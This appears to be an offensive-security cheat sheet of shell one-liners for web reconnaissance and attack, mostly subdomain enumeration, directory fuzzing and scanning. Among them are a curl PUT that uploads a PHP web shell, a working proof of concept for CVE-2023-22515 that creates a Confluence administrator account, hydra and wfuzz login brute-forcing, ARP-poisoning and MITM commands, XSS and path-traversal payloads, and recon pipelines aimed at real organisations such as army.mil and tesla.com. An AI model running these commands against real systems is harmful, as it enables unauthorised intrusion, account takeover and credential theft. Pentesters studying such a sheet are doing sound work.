

----
----
----
##-=========================-##
##    [+]  Nikto
##-=========================-##
nikto -h http://$IP


##-==================================-##
##    [+]  Nikto - Connect using squid proxy
##-==================================-##
nikto -h $IP -useproxy http://$IP:4444


##-====================-##
##    [+]  Curl - Get header
##-====================-##
curl -i $IP


##-=======================-##
##    [+]  Curl - Get everything
##-=======================-##
curl -i -L $IP


##-==============================-##
##    [+]  Curl - Check for title and all links
##-==============================-##
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-=================================-##
##    [+]  Curl - Look at page with just text
##-=================================-##
curl $IP -s -L | html2text -width '99' | uniq


##-====================================-##
##    [+]  Curl - Check if its possible to upload
##-====================================-##
curl -v -X OPTIONS http://$IP
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php


##-=========================-##
##    [+]  
##-=========================-##
dotdotpwn.pl -m http -h $IP -M GET -o unix




##-==============================-##
##    [+]  
##-==============================-##
curl -s "https://crt.sh/?q=%25.$DM&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$DM" | anew -q .tmp/cert.list


##-==============================-##
##    [+]  
##-==============================-##
curl -s "https://api.hackertarget.com/hostsearch/?q=$DM" | grep -o "\w.*$DM" | anew -q .tmp/htarget.list


##-==============================-##
##    [+]  
##-==============================-##
curl -s "https://riddler.io/search/exportcsv?q=pld:$DM" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$DM" | anew -q .tmp/riddler.list



##-=================================-##
##    [+]  NMap - Shodan API NSE Script:
##-=================================-##
nmap -sn -Pn -n --script=shodan-api -script-args ‘shodan-api.apikey=$APIKey’ $Domain




##-=========================-##
##   PoC for CVE-2023-22515: 
##-=========================-##
curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://confluence/setup/setupadministrator.action 

## ----------------------------------------------------------- ##
##    [?]  login with adm1n/adm1n)
## ----------------------------------------------------------- ##



##-============================================-##
##    [+]  
##-============================================-##
assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
python3 ~/tools/Sublist3r/


##-============================================-##
##     [+] ffuf - Search to files using assetfinder and ffuf
##-============================================-##
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'


##-============================================-##
##  [+] HTTPX -  new mode location and XSS injection
##-============================================-##
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'



##-======================-##
##    [+]  :
##-======================-##
assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"



##-=========================-##
##    [+]  Recon subdomains and Screenshot to URL using gowitness

##-==============================-##
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 




##   [+] SUBDOMAIN ENUMERATION

##-=========================-##
##   [+] 
##-=========================-##
curl -s "https://crt.sh/?q=%25.$DM&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$DM" | anew -q .tmp/cert.list
 

##-=========================-##
##   [+] 
##-=========================-##
curl -s "https://api.hackertarget.com/hostsearch/?q=$DM" | grep -o "\w.*$DM" | anew -q .tmp/htarget.list


##-=========================-##
##   [+] 
##-=========================-##
curl -s "https://riddler.io/search/exportcsv?q=pld:$DM" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$DM" | anew -q .tmp/riddler.list


##-=========================-##
##   [+] 
##-=========================-##
assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
    python3 ~/tools/Sublist3r/


##-=========================-##
##   [+] 
##-=========================-##
sublist3r.py -d $DM -o .tmp/sublister.list &> /dev/null


##-=========================-##
##   [+] 
##-=========================-##
 subfinder -silent -d $DM -all -t 100 -o .tmp/subfinder.list &> /dev/null


##-=========================-##
##   [+] 
##-=========================-##
amass enum -passive -d $DM -o .tmp/amass.list &> /dev/null


##-=========================-##
##   [+] 
##-=========================-##
crobat -s $DM | anew -q .tmp/crobat.list





##-======================-##
##    [+]  :
##-======================-##
sublist3r.py -d $DM -o .tmp/sublister.list &> /dev/null
   
 
##-======================-##
##    [+]  :
##-======================-##
 subfinder -silent -d $DM -all -t 100 -o .tmp/subfinder.list &> /dev/null
 
 
##-======================-##
##    [+]  :
##-======================-##
amass enum -passive -d $DM -o .tmp/amass.list &> /dev/null


Amass intel will search the organization "PayPal" 
from a database of ASNs at a faster-than-default rate.
 It will then take these ASN numbers and scan the complete ASN/IP space for all TLD's in that IP space (paypal.com, paypal.co.id, paypal.me).

##-======================-##
##    [+]  :
##-======================-##
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''





##-======================-##
##    [+]  :
##-======================-##
crobat -s $DM | anew -q .tmp/crobat.list



##-=================================-##
##    [+]  Ettercap - ARP Cache Poisoning 
##-=================================-##
ettercap -T -q -i <interface> -w dump -M ARP /<ip_target>/ /<ip_gateway>/



##  Note: Do not forget to enable routing, 
##  otherwise it will cut internet connection for targets.


##-========================-##
##     [+]  Bettercap - Web UI
##-========================-##
bettercap -caplet https-ui -iface <interface>


##-=========================-##
##     [+]  Bettercap - LAN Recon
##-=========================-##
net.recon on 		# Periodically read ARP table in order to detect new hosts on LAN
net.probe on 		# Send different types of probes to each IP in current subnet




##-=========================-##
##    [+]  DSniff - 
##-=========================-## 
dsniff -p $File.pcap
dsniff -i <interface>


##-===============================-##
##    [+]  URLSnarf - MITM URL sniffing:
##-===============================-##
urlsnarf -p $File.pcap
urlsnarf -i <interface>



mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --filepwn











##-==============================-##
##     [+] FinalRecon - Check Headers
##-==============================-##
python3 finalrecon.py --headers $URL


##-===================================-##
##     [+] FinalRecon - Check SSL Certificate
##-===================================-##
python3 finalrecon.py --sslinfo $URL


##-===============================-##
##     [+] FinalRecon - Check Whois Info
##-===============================-##
python3 finalrecon.py --whois $URL


##-============================-##
##     [+] FinalRecon - Crawl Target
##-============================-##
python3 finalrecon.py --crawl $URL

##-=================================-##
##     [+] FinalRecon - Directory Searching
##-=================================-##
python3 finalrecon.py --dir $URL -e txt,php -w /$Dir/$File


##-=========================-##
##     [+] FinalRecon - Full Scan
##-=========================-##
python3 finalrecon.py --full $URL





##-=================================-##
##     [+] Dirb - No recursive + output file:
##-=================================-##
dirb http://$IP -r -o dirb-IPAddr.txt


##-==================================-##
##     [+] Dirb - Test with specified wordlist
##-==================================-##
dirb http://$IP /usr/share/wordlists/dirb/common.txt


##-==================================-##
##     [+] Dirb -Test for specific extensions
##-==================================-##
dirb http://$IP -X .php,.txt


##-==================================-##
##     [+] Dirb - Connection Through proxy
##-==================================-##
dirb http://$IP -p $PROXYIP:$PROXYPORT -P $User:$Pass


##-===============================-##
##     [+] Web Scanning with extensions
##-===============================-##



##-==============================-##
##     [+] Gobuster - Linux 
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: Apache
## -------------------------------------------------------------- ##
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401


##-==========================-##
##     [+] Gobuster - Windows 
##-==========================-##
## ---------------------------------------------------- ##
##    [?]  Example web server: IIS
## ---------------------------------------------------- ##
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401


##-===============================-##
##     [+] DirSearch - Linux 
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: Apache)
## -------------------------------------------------------------- ##
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50


##-===============================-##
##     [+] DirSearch - Windows
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: IIS)
## -------------------------------------------------------------- ##
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50



##-===============================-##
##     [+] DirSearch - banner inspection
##-===============================-##
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old




##-========================-##
##     [+] HTTP
##-========================-##
gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69



##-========================-##
##     [+]  ##     [+] Gobuster - HTTPS
##-========================-##
gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69 



##-========================-##
##     [+] Gobuster - 
##-========================-##
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -x '.php' -e -t 25



##-========================-##
##     [+] Gobuster - 
##-========================-##
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -e -t 25




##   Paramspider - 

##-========================-##
##     [+] Paramspider - Discover URLs for a single domain:
##-=========================-##paramspider -d example.com



##-========================-##
##     [+] Paramspider - Discover URLs for multiple
domains from a file:
##-==============================-##
paramspider -l domains.txt


##-========================-##
##     [+] Paramspider - Stream URLs on the termial:
##-==============================-##
paramspider -d example.com -s


##-=========================-##
##     [+] Paramspider - Set up web request proxy:
##-==============================-##
paramspider -d example.com --proxy '127.0.0.1:7890'



##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Adding a placeholder for URL 
##  parameter values (default: "FUZZ"):
##-==============================-##
paramspider -d example.com -p '"><h1>reflection</h1>'






##-=========================-##
##    [+]  Nikto 
##-=========================-##
nikto -h 10.10.10.10 -p 80

##-=========================-##
##    [+]  Nikto HTTPS 
##-=========================-##
nikto -h 10.10.10.10 -p 443



##-=========================-##
##    [+]  wfuzz POST 
##-=========================-##
wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php 


##-=========================-##
##    [+]  hydra POST 
##-=========================-##
hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20 


##-========================-##
##     [+]  wfuzz - NTLM 
##-=========================-##
wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api 


##-================================-##
##     [+]  wfuzz Basic Auth through Proxy 
##-==============================-##

wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/





##-========================-##
##     [+] 
##-========================-##
wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt



##-========================-##
##   [+]  WFuzz - 
##-========================-##
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'



##-========================-##
##   [+]  WFuzz - Write to File
##-========================-##
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404



##-========================-##
##   [+]  WFuzz - Custom Scan with limited Output
##-========================-##
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20



##-========================-##
##   [+]  WFuzz - Fuzzing two Parameters at once
##-==============================-##

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - Domain
##-========================-##
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/



##-========================-##
##   [+]  WFuzz - Subdomain
##-========================-##
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>


##-========================-##
##     [+] 
##-========================-##
##      [+]  WFuzz - Git
##-========================-##
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404



##-========================-##
##     [+]  WFuzz - Login
##-========================-##
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"



##-========================-##
##      [+]  WFuzz - SQL
##-========================-##
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http


##-========================-##
##   [+]  WFuzz - DNS
##-========================-##
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100



##-==============================-##
##   [+]  WFuzz - Numbering Files
##-==============================-##
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip



##-==============================-##
##   [+]  WFuzz - Enumerating PIDs
##-==============================-##
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000




##-========================-##
##     [+] 
##-========================-##
##-==============================-##
##   [+] Fuzz files and directories

##-==============================-##

##   [+] files
##-=========================-##
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 200 -f recon/wfuzz-files.out "$URL/FUZZ" 
feroxbuster --url $URL -e -x .php,txt,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o recon/ferox.out


##-========================-##
##     [+] 
##-========================-##
##   [+] directories

##-==============================-##

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -t 200 -f recon/wfuzz-dirs.out "$URL/FUZZ/"
ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 200 -o recon/ffuf.md
dirb $URL /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -o recon/dirb.out 
dirbuster -r recon/dirbuster.out #GUI
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -o recon/gobuster.out


##-========================-##
##     [+] 
##-========================-##
##   [+] 

##-==============================-##
##     [+] ffuf -change request method
##-========================-##
ffuf -c -t 200 -fs 50,182 -u "$URL/FUZZ/" -w /usr/share/wordlists/dirb/big.txt -o recon/ffuf-post_method.md -t 200 -X POST


##-========================-##
##     [+] 
##-========================-##
##   [+] 
##-==============================-##
##     [+] ffuf -FUZZ file extensions
##-==============================-##
##-========================-##
ffuf -u $URL/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -o recon/ffuf-ext.md -t 200
ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .sh,.cgi,.pl,.py -fc 404 -t 200 -o recon/ffuf-extensions.md

##-========================-##
##     [+] 
##-========================-##

##-==============================-####     [+] ffuf -FUZZ parameters

##-==============================-##
don't forget to include LFI or RFI statements

ffuf -u "$URL/?FUZZ=1" -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39 -t 200
for i in {0..255}; do echo $i; done | ffuf -u '$URL?id=FUZZ' -c -w - -fw 33 -t 200 -o recon/sequence.md


##-==============================-##
##     [+] ffuf -

##-==============================-##
ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null


##-======================-##
##    [+]  :
##-======================-##
gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 
 
##-======================-##
##    [+]  :
##-======================-##
amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json

##-======================-##
##    [+]  :
##-======================-##
cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains
    
##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null

##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list




##-======================-##
##    [+]  :
##-======================-##
    
if [ -f "$EC" ]; then

       cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
fi




##-===================================-##
##    [+]   WEB PROBING AND SCREENSHOT
##-===================================-##
naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt

cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt




##-======================-##
##    [+]  :
##-======================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null








##-========================-##
##     [+] 
##-========================-##
##   [+] bruteforce login
##-=========================-##
wfuzz -c -z file,users.txt -z file,pass.txt -d "name=FUZZ&password=FUZ2Z" --sc 200 --hh 206 -t 200 $URL/login.php

##-==============================-##
## check type: GET or POST request 
##-==============================-##
hydra -I -V -F -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password:H=Cookie: PHPSESSID=cd892e2HNW3N" -t 64


##-==============================-##
##     [+] subdomain bruteforce
##-==============================-##
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 7 -t 200 -u "$URL" -H "Host: FUZZ.$domain"
gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200


##-==============================-##
##   [+] vulnerability scanners
##-==============================-##


##-========================-##
##     [+] 
##-========================-##
nikto --host $URL -C all -o recon/nikto.txt 
whatweb -a 4 $URL



##-==========================================-##
##     [+] WFuzz - Fuzz a range of IPs/Port numbers
##-==========================================-##
wfuzz -z range,1-65600 --hc 500  "http://IP:PORT/dir?parameter=id&port=FUZZ"



##-========================-##
##     [+] ffuf -
##-========================-##
ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null


##-========================-##
##     [+] ffuf - Wfuzz style of URL param fuzzing:
##-========================-##
ffuf -w /usr/share/commix/src/txt/passwords_john.txt    -u 'http://eve.example.com/url/path?username=alice&password=FUZZ'  --fw 3  -c



##-========================-##
##     [+] ffuf - Dirbuster/gobuster style URL path fuzzing:
##-========================-##
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt  -u http://eve.example.com/url/path/FUZZ  -e php



##-========================-##
##     [+] 
##-========================-##
gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 
 
##-========================-##
##     [+] 
##-========================-##
amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json



##-========================-##
##     [+] 
##-========================-##
cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains



##-========================-##
##     [+] 
##-========================-##
xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null



##-========================-##
##     [+] 
##-========================-##
xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list



if [ -f "$EC" ]; then
    cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

fi



##-=====================================-##
##     [+] naabu - Web Probing + Screenshots:
##-====================================-##
##   WEB PROBING AND SCREENSHOT
 naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt


##-========================-##
##     [+] 
##-========================-##
cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null


##-========================-##
##     [+] Gospider - 
##-========================-##
gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list


##-================================-##
##     [+] Gospider - Search Subdomain
##-================================-##
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null


##-==========================================-##
##     [+] Filtering duplicate and common endpoints
##-==========================================-##
cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $DM | sort -u | uro | anew -q database/urls.txt 

 
 
 
 
##-=============================-##
##    [+] Gather all urls, send to burp:
##-=============================-##
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt

cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt

ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
 
 
 
 
 
 
 
 
 
 
 
 



##-====================================-##
##     [+] bbot - Full subdomain  enumeration
##-====================================-##
bbot -t $Domain -f subdomain-enum



##-=========≈=≈=======================-##
##     [+] bbot - Subdomains (passive only):
##-================/===================-##
bbot -t $Domain -f subdomain-enum -rf passive


## ------------------------------------------------------------------ ##
##     [?]  Port-scan every subdomain
##     [?]  screenshot every webpage
##     [?]  output to current directory
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum -m nmap gowitness -n my_scan -o .


##-=========≈=≈=======================-##
##     [+] bbot - Subdomains + basic web scan:
##-=========≈=≈=======================-##
## ------------------------------------------------------------------ ##
##     [?]  includes wappalyzer, robots.txt,
##     [?]  and other non-intrusive web modules
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum web-basic


##-=========================-##
##      [+]  bbot - Web spider:
##-=========================-##
## ------------------------------------------------------------------ ##
##     [?] Crawl $Domain
##     [?] max depth of 2 
##     [?] auto extract emails, secrets, etc.
## ------------------------------------------------------------------ ##
bbot -t $Domain -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2


##-========================================-##
##     [+]  bbot - Everything everywhere all at once:
##-========================================-##
## ------------------------------------------------------------------ ##
##     [?]  Subdomains, emails, web scan,
##     [?]  cloud buckets, port scan, 
##     [?]  web screenshots, nuclei
## ------------------------------------------------------------------ ##
bbot -t  $Domain -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly


##-======================-##
##      [+]  :
##-======================-##
metagoofil -d $Domain -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 20 -n 20  -o ~/Desktop/$Domain/metagoofil/ -f ~/Desktop/$Domain/users_temp.txt 


##-======================-##
##      [+]  :
##-======================-##
metagoofil -d $Domain -t doc,pdf -l 100 -n 3 -o $MetagoofilFiles
 
 
##-======================-##
##      [+]  :
##-======================-##
exiftool -r *.doc | egrep -i "Author|Creator|Email|Producer|Template" | sort -u
 
 
##-======================-##
##     [+]  :
##-======================-##
metagoofil -d $Domain -t doc,pdf -l 100 -n 3 -o $MetagoofilFiles




##-====================================-##
##     [+]  WPScan - 
##-====================================-##
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50


##-====================================-##
##     [+]  WPScan - 
##-====================================-##
wpscan --username bully --url http://172.31.2.117/bull/ --wordlist words-john.txt --threads 10


##-====================================-##
##     [+]  WPScan - 
##-====================================-##
wpscan --url 172.31.2.117/bull/ -r --enumerate u --enumerate p --enumerate t --enumerate tt


##-====================================-##
##     [+]  WPScan - 
##-====================================-##
wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt



##-====================================-##
##     [+]  Cors Misconfigration - One Liners
##-====================================-##
cors_reflect_auto(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;$url;else echo Nothing on "$url";fi;done
}


cors_null_origin(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done

}


cors_null_value(){
        gau $1 | while read url;do target=$(curl -s -I -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}


cors_trust_subdomain(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: evil.$url" -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}


cors_domain_not_valid(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://not$site" -X GET "$url") | if grep 'Access-Control-Allow-Origin: https://not$site'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}

cors_dom_ext(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: $site.evil.com" -X GET "$url") | if grep "Origin: Access-Control-Allow-Origin: $site.evil.com";  then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}





